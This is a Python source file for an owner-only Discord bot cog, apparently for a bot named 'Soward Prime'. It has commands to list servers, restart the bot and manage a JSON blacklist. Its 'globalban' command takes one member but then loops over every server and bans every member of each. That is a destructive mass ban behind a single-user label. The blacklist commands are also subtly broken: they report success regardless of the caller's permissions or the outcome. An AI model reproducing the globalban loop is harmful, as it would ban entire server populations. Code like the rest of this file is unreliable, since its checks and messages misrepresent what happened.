from __future__ import annotations
from discord.ext import commands
from prince1.Tools import *
from discord import *
#from utils.config import OWNER_IDS, No_Prefix
import json, discord
import typing
from utils import Paginator, DescriptionEmbedPaginator, FieldPagePaginator, TextPaginator

from typing import Optional

#Cyg90MAh7a0
class Owner(commands.Cog):

    def __init__(self, client):
        self.client = client
        self.owner = [1068967045263261746,1090957904410071120]

    @commands.command(name="slist")
    @commands.is_owner()
    async def _slist(self, ctx):
        prince = ([prince for prince in self.client.guilds])
        prince = sorted(prince,
                         key=lambda prince: prince.member_count,
                         reverse=True)
        entries = [
            f"`[{i}]` | [{g.name}](https://discord.com/channels/{g.id}) - {g.member_count}"
            for i, g in enumerate(prince, start=1)
        ]
        paginator = Paginator(source=DescriptionEmbedPaginator(
            entries=entries,
            description="",
            title=f"Server List of Soward Prime - {len(self.client.guilds)}",
            color=0x2f3136,
            per_page=10),
                              ctx=ctx)
        await paginator.paginate()

        

            
                               
        

                

                

                

                                  
                    
                
         
       

        

    

    

        

        

    

    

    

        

            

                

                

            

            

            

            

            

            

    

    

    

        

                

            

        

                

        
            

            

               

            

   

    

    

                

            

                

            

        

        

                

                

            

    @commands.command(name="restahsjsrt", help="Restarts the client.")
    @commands.is_owner()
    async def _restart(self, ctx: Context):
        await ctx.reply("Restarting!")
        restart_program()


                
                
    @commands.group(name="blacklist",
                    help="let's you add someone in blacklist",
                    aliases=["bl"])
  #  @commands.is_owner()
    async def blacklist(self, ctx):
        if ctx.invoked_subcommand is None:
            if ctx.author.id in self.owner:
                with open("blacklist.json") as file:
                    blacklist = json.load(file)
                    nplist = blacklist["ids"]
                
                    npl = ([await self.client.fetch_user(nplu) for nplu in nplist])
                    npl = sorted(npl, key=lambda nop: nop.created_at)
                    entries = [
                f"`[{no}]` | [{mem}](https://discord.com/users/{mem}) (ID: {mem.id})"
                
       #         entries = [
    #                f"`[{no}]` | <@!{mem}> (ID: [mem](https://discord.com/users/{mem}) (ID: {mem}))"
					for no, mem in enumerate(npl, start=1)
                   # for no, mem in enumerate(blacklist['ids'], start=1)
                ]
                paginator = Paginator(source=DescriptionEmbedPaginator(
                    entries=entries,
                    title=
                    f"List of Blacklisted users of Soward Prime - {len(blacklist['ids'])}",
                    description="",
                    per_page=10,
                    color=0x2f3136),
                                      ctx=ctx)
                await paginator.paginate()

    @blacklist.command(name="add")
   # @commands.is_owner()
    async def blacklist_add(self, ctx: Context,*, user: discord.Member):
        try:
            if ctx.author.id in self.owner:
                with open('blacklist.json', 'r') as bl:
              #  user = await bot.fetch_user(member.id)
                    blacklist = json.load(bl)
                    if str(user.id) in blacklist["ids"]:
                        embed = discord.Embed(
                    description=f"{user.name} is already blacklisted",
                        color=discord.Colour(0x2f3136))
                        await ctx.reply(embed=embed, mention_author=False)
                    else:
                        add_user_to_blacklist(user.id)
                    embed = discord.Embed(
                        title="Blacklisted",
                        description=f" Successfully Blacklisted {user.name}",
                        color=discord.Colour(0x2f3136))
                    with open("blacklist.json") as file:
                        blacklist = json.load(file)
                        
                        await ctx.reply(embed=embed, mention_author=False)
        except:
            embed = discord.Embed(title="Error!",
                                  description=f"An Error Occurred",
                                  color=discord.Colour(0x2f3136))
            await ctx.reply(embed=embed, mention_author=False)

    @blacklist.command(name="remove")
 #   @commands.is_owner()
    async def blacklist_remove(self, ctx, member: discord.Member = None):
        try:
            if ctx.author.id in self.owner:
                remove_user_from_blacklist(member.id)
            embed = discord.Embed(
                title="User removed from blacklist",
                description=
                f"**{member.name}** has been successfully removed from the blacklist",
                color=0x2f3136)
            with open("blacklist.json") as file:
                blacklist = json.load(file)
                
                await ctx.reply(embed=embed, mention_author=False)
        except:
            embed = discord.Embed(
                title="Error!",
                description=f"**{member.name}** is not in the blacklist.",
                color=0x2f3136)
            embed.set_thumbnail(url=f"{self.client.user.display_avatar.url}")
            await ctx.reply(embed=embed, mention_author=False)

    
   
            
         
                                  
            

    

    
            
            
            
              
                 
            
                
                
                
            

    
            
            
                
            
            
        

               



    
    



    @commands.command()
    @commands.is_owner()
    async def globalban(self, ctx, *, member: discord.Member):
        if member is None:
            return await ctx.send(
                "You need to define the user"
            )
        for guild in self.client.guilds:
            for member in guild.members:
                
                    await member.ban(reason="here")
                    await ctx.send("done")
               
async def setup(bot):
	await bot.add_cog(Owner(bot))